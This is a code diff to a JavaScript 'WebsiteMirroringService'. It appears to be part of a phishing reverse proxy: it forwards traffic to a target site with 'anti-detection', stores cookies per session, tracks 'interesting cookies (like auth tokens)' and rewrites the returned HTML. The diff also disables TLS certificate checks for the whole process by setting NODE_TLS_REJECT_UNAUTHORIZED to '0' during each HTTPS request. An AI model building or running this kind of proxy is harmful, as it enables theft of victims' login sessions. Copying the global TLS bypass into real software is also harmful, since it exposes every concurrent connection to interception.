@@ -1639,17 +1639,8 @@ class WebsiteMirroringService {
       await new Promise(resolve => setTimeout(resolve, randomDelay));
 
       // Make request to target website with advanced anti-detection
-      // Create SSL/TLS configuration for this specific request
-      const httpsAgent = new https.Agent({
-        rejectUnauthorized: false, // Allow self-signed certificates
-        secureOptions: require('constants').SSL_OP_LEGACY_SERVER_CONNECT, // Allow legacy SSL connections
-        ciphers: 'ALL', // Allow all cipher suites
-        secureProtocol: 'TLS_method', // Use flexible TLS method
-        minVersion: 'TLSv1', // Allow older TLS versions
-        maxVersion: 'TLSv1.3' // But cap at TLS 1.3
-      });
-
-      const response = await axiosInstance({
+      // Handle SSL/TLS issues through axios configuration instead of custom agent
+      const axiosConfig = {
         method: req.method,
         url: fullTargetUrl,
         headers,
@@ -1659,52 +1650,40 @@ class WebsiteMirroringService {
         timeout: 30000, // Increased timeout for better reliability
         decompress: true,
         jar: cookieJar,
-        withCredentials: true,
-        // Add HTTPS agent only for HTTPS requests to avoid conflicts
-        ...(fullTargetUrl.startsWith('https:') ? { httpsAgent } : {})
-      });
-      
-      // Save cookies from response with advanced processing
-      if (response.headers['set-cookie']) {
-        const cookies = Array.isArray(response.headers['set-cookie']) 
-          ? response.headers['set-cookie'] 
-          : [response.headers['set-cookie']];
-          
-        cookies.forEach(cookie => {
-          this.storeCookieForLater(sessionToken, cookie, fullTargetUrl);
-        });
+        withCredentials: true
+      };
+
+      // For HTTPS URLs with potential SSL issues, configure axios to be more permissive
+      if (fullTargetUrl.startsWith('https:')) {
+        // Use process.env to disable SSL verification globally for this request
+        const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+        process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
         
-        // Track interesting cookies (like auth tokens)
-        this.trackInterestingCookies(sessionToken, cookies);
-      }
-
-      // Handle redirects
-      if (response.status >= 300 && response.status < 400 && response.headers.location) {
-        return this.handleRedirect(session, req, res, response);
-      }
-
-      // Process response headers before sending them
-      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
-      
-      // Set all processed response headers
-      Object.entries(processedHeaders).forEach(([key, value]) => {
-        if (value !== undefined && value !== null) {
-          res.setHeader(key, value);
+        try {
+          const response = await axiosInstance(axiosConfig);
+          
+          // Restore original SSL setting
+          if (originalRejectUnauthorized !== undefined) {
+            process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
+          } else {
+            delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+          }
+          
+          // Continue with response processing
+          return await this.processResponse(response, session, req, res, sessionToken, fullTargetUrl);
+        } catch (error) {
+          // Restore original SSL setting even on error
+          if (originalRejectUnauthorized !== undefined) {
+            process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized;
+          } else {
+            delete process.env.NODE_TLS_REJECT_UNAUTHORIZED;
+          }
+          throw error;
         }
-      });
-
-      res.status(response.status);
-
-      // Modify HTML content if it's HTML with advanced anti-detection
-      const contentType = response.headers['content-type'] || '';
-      if (contentType.includes('text/html')) {
-        const charset = this.extractCharset(contentType) || 'utf-8';
-        const html = response.data.toString(charset);
-        const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, targetUrl, req);
-        res.send(modifiedHtml);
       } else {
-        // Pass through non-HTML content unchanged
-        res.send(response.data);
+        // HTTP requests don't need special SSL handling
+        const response = await axiosInstance(axiosConfig);
+        return await this.processResponse(response, session, req, res, sessionToken, fullTargetUrl);
       }
     } catch (error) {
       console.error('Error handling mirror request:', error);
@@ -2002,6 +1981,54 @@ class WebsiteMirroringService {
         }
       );
     });
+  }
+  
+  /**
+   * Process response from target website
+   */
+  async processResponse(response, session, req, res, sessionToken, fullTargetUrl) {
+    // Save cookies from response with advanced processing
+    if (response.headers['set-cookie']) {
+      const cookies = Array.isArray(response.headers['set-cookie']) 
+        ? response.headers['set-cookie'] 
+        : [response.headers['set-cookie']];
+        
+      cookies.forEach(cookie => {
+        this.storeCookieForLater(sessionToken, cookie, fullTargetUrl);
+      });
+      
+      // Track interesting cookies (like auth tokens)
+      this.trackInterestingCookies(sessionToken, cookies);
+    }
+
+    // Handle redirects
+    if (response.status >= 300 && response.status < 400 && response.headers.location) {
+      return this.handleRedirect(session, req, res, response);
+    }
+
+    // Process response headers before sending them
+    const processedHeaders = this.processResponseHeaders(response.headers, session, req);
+    
+    // Set all processed response headers
+    Object.entries(processedHeaders).forEach(([key, value]) => {
+      if (value !== undefined && value !== null) {
+        res.setHeader(key, value);
+      }
+    });
+
+    res.status(response.status);
+
+    // Modify HTML content if it's HTML with advanced anti-detection
+    const contentType = response.headers['content-type'] || '';
+    if (contentType.includes('text/html')) {
+      const charset = this.extractCharset(contentType) || 'utf-8';
+      const html = response.data.toString(charset);
+      const modifiedHtml = await this.modifyHtmlContent(html, sessionToken, session.targetUrl, req);
+      res.send(modifiedHtml);
+    } else {
+      // Pass through non-HTML content unchanged
+      res.send(response.data);
+    }
   }
 }
 
